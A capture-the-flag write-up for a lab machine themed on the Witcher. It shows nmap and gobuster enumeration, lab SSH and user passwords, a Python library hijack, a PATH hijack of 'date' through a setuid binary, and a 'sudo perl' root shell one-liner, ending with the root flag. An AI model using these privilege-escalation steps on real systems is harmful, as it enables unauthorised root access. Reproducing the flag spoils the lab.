# Toss a coin

## Enumeration
```bash
└─$ nmap  -sV -A -p- -sC  10.10.155.232
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-20 10:42 BST
Nmap scan report for 10.10.155.232
Host is up (0.049s latency).
Not shown: 65533 clo10.10.215.79sed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Toss a coin to your witcher
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.61 seconds

└─$ gobuster dir -u http://10.10.155.232 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x txt,php,js
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.155.232
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/t                    (Status: 301) [Size: 0] [--> t/]
/img                  (Status: 301) [Size: 0] [--> img/]
Progress: 99509 / 566836 (17.56%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 99609 / 566836 (17.57%)
===============================================================
Finished
===============================================================
```

### After a long time i got this : http://10.10.155.232/t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l/l/e/y/_/o/f/_/p/l/e/n/t/y/
```bash
ssh jaskier:YouHaveTheMostIncredibleNeckItsLikeASexyGoose
```
## Exploitation

## Privilege Escalation
### I found a script using random python library so I hijack it
```bash
touch random.py

import os
os.system("bash")

sudo -u yen /usr/bin/python3.6 /home/jaskier/toss-a-coin.py
```
## User FLAG
I forgot to write it

```bash
└─$ strings portal
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
puts
getchar
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
I am preparing a portal for you Geralt.
/bin/echo -n 'It will be ready in about ' && date --date='next hour' -R
You just have to wait for it
Segmentation fault (core dumped)
:*3$"
GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8060
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
portal.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@@GLIBC_2.2.5
_edata
system@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
getchar@@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```
### Binary hijack on date binary

```bash
vim date
#!/bin/bash
/bin/bash

chmod +x date
export PATH=.:$PATH

./portal
```
### I got a shell as geralt

```bash
cd /home/geralt
```
```cat password.txt``` : IH4teP0rt4ls
```bash
sudo -l 

[sudo] password for geralt: 
Matching Defaults entries for geralt on the-continent:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User geralt may run the following commands on the-continent:
    (root) /usr/bin/perl
```

```bash
sudo perl -e 'exec "/bin/sh";'
```

## Root FLAG
```cat /root/root.txt``` : EPI{D3s71Ny_1s_Ju5t_Th3_3mB0D1m3Nt_0f_Th3_S0uL_S_D3s1R3_T0_Gr0W}



